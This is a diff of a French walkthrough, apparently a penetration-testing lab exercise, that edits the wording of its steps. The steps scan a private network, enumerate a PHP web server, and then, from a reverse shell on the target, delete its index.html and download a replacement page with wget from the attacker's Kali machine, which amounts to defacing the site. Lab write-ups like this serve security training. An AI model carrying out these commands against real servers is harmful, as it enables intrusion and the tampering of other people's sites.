@@ -4,7 +4,9 @@
 
 > nmap 192.168.60.0/24
 
-Visite du site web, on trouve que le serveur utilise php
+On trouve un serveur http sur le port 80 sur 192.168.60.10
+
+Visite du site web via le navigateur, on trouve notamment que le serveur utilise php
 
 > dirb http://192.168.60.10/
 
@@ -46,15 +48,13 @@ Vérifier qu'on est dans le bon dossier:
 
 > ls 
 
-Depuis un nouveau terminal kali, dans le dossier server sur le bureau, lancher un serveur pour transférer les fichiers:
+Depuis un nouveau terminal kali, depuis le dossier server sur le bureau, lancher un serveur pour transférer les fichiers:
 
 > python -m SimpleHTTPServer
 
-Depuis le reverse shell, supprimer index.html:
+Depuis le reverse shell, supprimer index.html, puis télécharger les fichiers nécessaires à afficher la nouvelle page d'acceuil:
 
 > rm index.html
-
-Télécharger les fichiers pour afficher la nouvelle page d'acceuil:
 
 > wget http://192.168.60.11:8000/index.html
 
